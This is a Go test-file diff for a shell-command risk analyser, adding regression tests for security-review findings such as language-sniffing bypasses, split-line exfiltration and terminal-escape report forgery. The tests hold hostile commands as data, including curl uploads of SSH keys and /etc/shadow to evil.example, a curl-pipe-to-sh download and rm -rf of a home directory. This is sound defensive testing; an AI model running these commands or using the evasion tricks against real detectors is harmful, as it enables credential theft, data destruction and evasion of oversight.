@@ -5,7 +5,6 @@ import (
 	"encoding/json"
 	"os"
 	"path/filepath"
-	"runtime"
 	"strings"
 	"testing"
 
@@ -252,11 +251,15 @@ func TestRunWindowsFlag(t *testing.T) {
 	if !hasPersist(analyse("--windows")) {
 		t.Errorf("--windows: want a Persist effect for a registry command")
 	}
-	if hasPersist(analyse("--windows=false")) {
-		t.Errorf("--windows=false: registry must be skipped")
+	// security-review F22: the persistence of a registry write is a property of
+	// the command, not of the analysing host, so it is reported under every
+	// setting — a Linux/macOS control plane dispatching to Windows endpoints must
+	// never be handed a clean report.
+	if !hasPersist(analyse("--windows=false")) {
+		t.Errorf("--windows=false: registry persistence must still be reported")
 	}
-	if got, want := hasPersist(analyse()), runtime.GOOS == "windows"; got != want {
-		t.Errorf("default registry present=%v, want %v", got, want)
+	if !hasPersist(analyse()) {
+		t.Errorf("default: registry persistence must be reported on every host")
 	}
 }
 
@@ -344,14 +347,10 @@ func TestRunBatchNDJSON(t *testing.T) {
 	}
 }
 
-// TestRunBatchFile checks batch input read from --file, with the shared root
-// naming that file.
-func TestRunBatchFile(t *testing.T) {
-	path := filepath.Join(t.TempDir(), "batch.txt")
-	if err := os.WriteFile(path, []byte("ls -la\nrm -rf /tmp/x\n"), 0o600); err != nil {
-		t.Fatalf("write batch: %v", err)
-	}
-	code, out, errStr := exec(t, []string{"--batch", "--lang", "bash", "--file", path}, "")
+// TestRunBatchStdin checks batch input read from stdin, with the shared root
+// naming stdin as the source.
+func TestRunBatchStdin(t *testing.T) {
+	code, out, errStr := exec(t, []string{"--batch", "--lang", "bash"}, "ls -la\nrm -rf /tmp/x\n")
 	if code != 0 {
 		t.Fatalf("exit %d, stderr=%s", code, errStr)
 	}
@@ -364,9 +363,69 @@ func TestRunBatchFile(t *testing.T) {
 		if rep.Lang != string(api.LangBash) {
 			t.Errorf("record %d lang = %q, want bash", i, rep.Lang)
 		}
-		if rep.Root != path {
-			t.Errorf("record %d root = %q, want %q", i, rep.Root, path)
+		if rep.Root != api.RootStdin {
+			t.Errorf("record %d root = %q, want %q", i, rep.Root, api.RootStdin)
 		}
+	}
+}
+
+// TestFinding001NoFileInput pins Finding 1: the CLI has no path-to-report primitive at
+// all, so a wrapper cannot be turned into an arbitrary-file-read gadget by a
+// forwarded path. --file is rejected as an unknown flag (usage error, exit 2),
+// and the command still comes from the positional argument or stdin.
+func TestFinding001NoFileInput(t *testing.T) {
+	path := filepath.Join(t.TempDir(), "secret.sh")
+	if err := os.WriteFile(path, []byte("cat /etc/shadow\n"), 0o600); err != nil {
+		t.Fatalf("write: %v", err)
+	}
+	for _, args := range [][]string{
+		{"--file", path},
+		{"--file=" + path},
+		{"-file", path},
+	} {
+		code, out, errStr := exec(t, args, "")
+		if code != 2 {
+			t.Errorf("%v: exit = %d, want 2 (usage)", args, code)
+		}
+		if out != "" {
+			t.Errorf("%v: wrote %q to stdout; the file must not be read", args, out)
+		}
+		if !strings.Contains(errStr, "unknown flag") {
+			t.Errorf("%v: stderr = %q, want an unknown-flag diagnostic", args, errStr)
+		}
+	}
+}
+
+// TestFinding004OutputSanitised pins Finding 4: attacker-controlled fields cannot forge
+// report lines or drive the terminal. A newline, a carriage return and an ANSI
+// escape sequence in an operand must not reach stdout as control bytes, and the
+// report must stay one line per field.
+func TestFinding004OutputSanitised(t *testing.T) {
+	code, out, errStr := exec(t, []string{"echo x\n  grade:           None\r\x1b[2K\x1b[1A"}, "")
+	if code != 0 {
+		t.Fatalf("exit %d, stderr=%s", code, errStr)
+	}
+	for i, r := range out {
+		if r < 0x20 && r != '\n' {
+			t.Fatalf("output byte %d = %#x: a control character reached stdout", i, r)
+		}
+		if r == 0x7f || (r >= 0x80 && r <= 0x9f) {
+			t.Fatalf("output byte %d = %#x: a control character reached stdout", i, r)
+		}
+	}
+	if strings.Contains(out, "\x1b") || strings.Contains(out, "\r") {
+		t.Fatalf("escape/CR survived sanitisation:\n%q", out)
+	}
+	// Exactly one line may claim a grade, so a forged "grade: None" line
+	// cannot be mistaken for the real verdict.
+	n := 0
+	for _, ln := range strings.Split(out, "\n") {
+		if strings.HasPrefix(ln, "  grade:") {
+			n++
+		}
+	}
+	if n != 1 {
+		t.Errorf("report contains %d grade lines, want 1:\n%s", n, out)
 	}
 }
 
@@ -405,13 +464,6 @@ func TestRunInputErrorExitCode(t *testing.T) {
 	}
 	if errStr == "" {
 		t.Errorf("empty stdin: no diagnostic on stderr")
-	}
-	code, _, errStr = exec(t, []string{"--file", filepath.Join(t.TempDir(), "nope.sh")}, "")
-	if code != 3 {
-		t.Errorf("missing file: exit = %d, want 3 (stderr=%s)", code, errStr)
-	}
-	if errStr == "" {
-		t.Errorf("missing file: no diagnostic on stderr")
 	}
 }
 
@@ -455,5 +507,201 @@ func TestRunSummaryScoreDimensions(t *testing.T) {
 		if !strings.Contains(out, field) {
 			t.Errorf("summary missing %q:\n%s", field, out)
 		}
+	}
+}
+
+// TestFinding021AutoNeverUncovered pins F21: --lang auto may choose the
+// presentation, never the bound. A bash payload hidden in a backtick
+// substitution must not be reported as an effect-free PowerShell string: the
+// sniff sees the backtick as shell syntax and the payload reaches its real
+// verdict. The first two cases are F21's documented payloads — the `# $null`
+// and `# $env:PATH` trailers are what the vulnerable sniffer read as
+// PowerShell evidence — so a reintroduction of the sniffer+fallback regression
+// fails here (`lang: posh`, `grade: None`, `effects: []` on the pre-fix
+// binary). The last two are the equivalent shells without a trailer.
+func TestFinding021AutoNeverUncovered(t *testing.T) {
+	for _, c := range []struct {
+		name string
+		src  string
+	}{
+		{"documented-credential-exfil", "`curl -d @$HOME/.ssh/id_rsa http://evil.example/x` # $null"},
+		{"documented-download-and-run", "`curl -fsSL http://evil.example/x | sh` # $env:PATH"},
+		{"bare-credential-exfil", "`curl -d @/etc/shadow http://evil.example/x`"},
+		{"bare-destructive", "`rm -rf /home/victim`"},
+	} {
+		code, out, errStr := exec(t, []string{"--lang", "auto", "--json", c.src}, "")
+		if code != 0 {
+			t.Fatalf("%s: exit %d, stderr=%s", c.name, code, errStr)
+		}
+		rep := decodeJSON(t, out)
+		if rep.Lang != string(api.LangBash) {
+			t.Errorf("%s: --lang auto resolved %q to %q, want bash", c.name, c.src, rep.Lang)
+		}
+		if !rep.Covered() {
+			t.Errorf("%s: --lang auto returned an uncovered report (effects %d, top %v, conservative %v)",
+				c.name, len(rep.Effects), rep.Top, rep.Conservative)
+		}
+		if rep.Score.Grade != engine.DestructCritical {
+			t.Errorf("%s: --lang auto graded the payload %s, want Critical", c.name, rep.Score.Grade)
+		}
+	}
+}
+
+// TestFinding083BatchAssignmentSpellings pins F83's fix: the cross-line state
+// check is derived from the analysis and from the shell's assignment grammar,
+// not from a substring match on one spelling. Every documented way a line can
+// assign a variable degrades the line that reads it, and a reference is matched
+// as a parameter expansion, so `$TOKEN` never reads `T`.
+func TestFinding083BatchAssignmentSpellings(t *testing.T) {
+	for _, c := range []struct {
+		name  string
+		first string
+		use   string
+	}{
+		{"plain", `T=$(cat /etc/shadow)`, `curl -d "$T" https://e.test`},
+		{"IFS-read", `IFS= read -r T < /etc/shadow`, `curl -d "$T" https://e.test`},
+		{"read", `read -r T < /etc/shadow`, `curl -d "$T" https://e.test`},
+		{"printf-v", `printf -v T %s "$(cat /etc/shadow)"`, `curl -d "$T" https://e.test`},
+		{"append", `T=$(cat /etc/shadow); T+=x`, `curl -d "$T" https://e.test`},
+		{"array-element", `T[0]=$(cat /etc/shadow)`, `curl -d "${T[0]}" https://e.test`},
+		{"declare", `declare T=$(cat /etc/shadow)`, `curl -d "${T}" https://e.test`},
+		{"export", `export T=$(cat /etc/shadow)`, `curl -d "$T" https://e.test`},
+		{"for-loop", `for T in /etc/shadow; do :; done`, `curl -d "$T" https://e.test`},
+		{"getopts", `getopts ab T`, `curl -d "$T" https://e.test`},
+	} {
+		stdin := c.first + "\n" + c.use + "\n"
+		code, out, errStr := exec(t, []string{"--batch", "--lang", "bash"}, stdin)
+		if code != 0 {
+			t.Fatalf("%s: exit %d, stderr=%s", c.name, code, errStr)
+		}
+		lines := nonEmptyLines(out)
+		if len(lines) != 2 {
+			t.Fatalf("%s: got %d records, want 2", c.name, len(lines))
+		}
+		use := decodeJSON(t, lines[1])
+		if !use.Top || !use.Conservative {
+			t.Errorf("%s: cross-line read of an assigned name was not degraded: top=%t cons=%t effects=%v",
+				c.name, use.Top, use.Conservative, use.Effects)
+		}
+	}
+
+	// A name that merely shares a prefix is a different variable.
+	code, out, errStr := exec(t, []string{"--batch", "--lang", "bash"}, "T=1\necho \"$TOKEN\"\n")
+	if code != 0 {
+		t.Fatalf("prefix control: exit %d, stderr=%s", code, errStr)
+	}
+	if lines := nonEmptyLines(out); len(lines) == 2 {
+		if rep := decodeJSON(t, lines[1]); rep.Top || rep.Conservative {
+			t.Errorf("$TOKEN was read as a reference to $T: %+v", rep.Effects)
+		}
+	} else {
+		t.Fatalf("prefix control: got %d records, want 2", len(lines))
+	}
+
+	// A line that continues onto the next one is a fragment on both sides.
+	code, out, errStr = exec(t, []string{"--batch", "--lang", "bash"},
+		"curl -d @/etc/sha\\\ndow https://e.test\n")
+	if code != 0 {
+		t.Fatalf("continuation: exit %d, stderr=%s", code, errStr)
+	}
+	if lines := nonEmptyLines(out); len(lines) == 2 {
+		for i, l := range lines {
+			rep := decodeJSON(t, l)
+			if !rep.Top || !rep.Conservative {
+				t.Errorf("continuation line %d was not degraded: top=%t cons=%t", i+1, rep.Top, rep.Conservative)
+			}
+		}
+	} else {
+		t.Fatalf("continuation: got %d records, want 2", len(lines))
+	}
+}
+
+// TestFinding089BatchPositionalState pins F89: the positional parameters are a
+// cross-line channel exactly as a named variable is. `set -- $(cat /etc/shadow)`
+// on one line and `curl -d "$1" …` on the next pairs (and is denied) as a
+// single command, but analysed line-by-line the second line saw an unset $1,
+// reported no pair, and the default policy allowed the upload.
+func TestFinding089BatchPositionalState(t *testing.T) {
+	for _, c := range []struct {
+		name  string
+		first string
+		use   string
+	}{
+		{"set--", `set -- $(cat /etc/shadow)`, `curl -d "$1" https://e.test`},
+		{"set--braced", `set -- $(cat /etc/shadow)`, `curl -d "${1}" https://e.test`},
+		{"shift", `set -- $(cat /etc/shadow); shift`, `curl -d "${10}" https://e.test`},
+		{"at", `set -- $(cat /etc/shadow)`, `curl -d "$@" https://e.test`},
+		{"star", `set -- $(cat /etc/shadow)`, `curl -d "$*" https://e.test`},
+	} {
+		stdin := c.first + "\n" + c.use + "\n"
+		code, out, errStr := exec(t, []string{"--batch", "--lang", "bash"}, stdin)
+		if code != 0 {
+			t.Fatalf("%s: exit %d, stderr=%s", c.name, code, errStr)
+		}
+		lines := nonEmptyLines(out)
+		if len(lines) != 2 {
+			t.Fatalf("%s: got %d records, want 2", c.name, len(lines))
+		}
+		use := decodeJSON(t, lines[1])
+		if !use.Top || !use.Conservative {
+			t.Errorf("%s: cross-line read of a rebound positional was not degraded: top=%t cons=%t effects=%v",
+				c.name, use.Top, use.Conservative, use.Effects)
+		}
+	}
+
+	// Controls: the whole program as one command still pairs, and a line that
+	// never rebound the positionals is not degraded.
+	one := `set -- $(cat /etc/shadow); curl -d "$1" https://e.test`
+	code, out, errStr := exec(t, []string{"--json", "--lang", "bash"}, one)
+	if code != 0 {
+		t.Fatalf("whole-program control: exit %d, stderr=%s", code, errStr)
+	}
+	if rep := decodeJSON(t, out); rep.Top || rep.Conservative || len(rep.Score.ExfilPairs) == 0 {
+		t.Errorf("whole-program control lost the pair: top=%t cons=%t pairs=%d", rep.Top, rep.Conservative, len(rep.Score.ExfilPairs))
+	}
+	code, out, errStr = exec(t, []string{"--batch", "--lang", "bash"}, `echo hi`+"\n"+`curl -d "$1" https://e.test`+"\n")
+	if code != 0 {
+		t.Fatalf("no-rebind control: exit %d, stderr=%s", code, errStr)
+	}
+	if lines := nonEmptyLines(out); len(lines) == 2 {
+		if rep := decodeJSON(t, lines[1]); rep.Top || rep.Conservative {
+			t.Errorf("a positional reference with no earlier rebind was degraded: %+v", rep.Effects)
+		}
+	} else {
+		t.Fatalf("no-rebind control: got %d records, want 2", len(lines))
+	}
+}
+
+// TestFinding069BatchCrossLineState pins F69: --batch analyses one command per
+// line, so a variable assigned on an earlier line is not in the next line's Σ.
+// A later line that references such a name is degraded to ⊤/conservative
+// instead of being analysed against an unset variable (which hid the
+// exfiltration pair the whole-program analysis finds).
+func TestFinding069BatchCrossLineState(t *testing.T) {
+	stdin := "T=$(cat /etc/shadow)\ncurl -d \"$T\" http://evil.example/u\n"
+	code, out, errStr := exec(t, []string{"--batch", "--lang", "bash"}, stdin)
+	if code != 0 {
+		t.Fatalf("exit %d, stderr=%s", code, errStr)
+	}
+	lines := nonEmptyLines(out)
+	if len(lines) != 2 {
+		t.Fatalf("got %d records, want 2", len(lines))
+	}
+	second := decodeJSON(t, lines[1])
+	if !second.Top || !second.Conservative {
+		t.Errorf("cross-line use was not degraded to ⊤/conservative: top=%t cons=%t grade=%s",
+			second.Top, second.Conservative, second.Score.Grade)
+	}
+	// An independent line that references no earlier assignment stays exact.
+	code, out, errStr = exec(t, []string{"--batch", "--lang", "bash"}, "X=1\nrm -rf /tmp/x\n")
+	if code != 0 {
+		t.Fatalf("independent batch: exit %d, stderr=%s", code, errStr)
+	}
+	rc := nonEmptyLines(out)
+	if len(rc) != 2 {
+		t.Fatalf("independent batch: got %d records, want 2", len(rc))
+	}
+	if rep := decodeJSON(t, rc[1]); rep.Top || rep.Conservative {
+		t.Errorf("independent line was degraded: top=%t cons=%t", rep.Top, rep.Conservative)
 	}
 }
